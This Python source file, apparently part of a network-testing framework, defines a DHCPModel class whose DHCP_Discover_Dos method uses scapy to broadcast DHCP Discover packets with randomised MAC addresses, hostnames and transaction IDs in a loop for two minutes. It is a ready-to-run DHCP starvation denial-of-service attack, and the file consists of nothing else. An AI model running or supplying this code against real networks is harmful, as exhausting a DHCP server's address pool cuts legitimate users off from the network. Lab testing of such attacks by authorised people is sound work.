import logging
import time
from scapy.config import conf


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


class DHCPModel:

    env = None

    def __init__(self, Environement):
        self.env = Environement
        conf.verb = 0
        conf.checkIpAddr = False

    def DHCP_Discover_Dos(self):
        scap = self.env.getImport('scapy.all')
        #scap = self.env.getImport('scapy.all')
        #run this for 2mins after stop
        t_end = time.time() + 60 * 2
        while time.time() < t_end:
            #randomize fields
            hostname = scap.RandString(12,'0123456789abcdef')
            m = scap.RandMAC()
            transid = scap.random.randint(0,0xFFFFFFFF)
            #craft discover dhcp
            tramedhcp = scap.Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/scap.IP(src="0.0.0.0",dst="255.255.255.255")/scap.UDP(sport=68,dport=67)/scap.BOOTP(xid=transid,chaddr=hostname)/scap.DHCP(options=[("message-type","discover"),"end"])

            #sendq
            scap.sendp(tramedhcp)
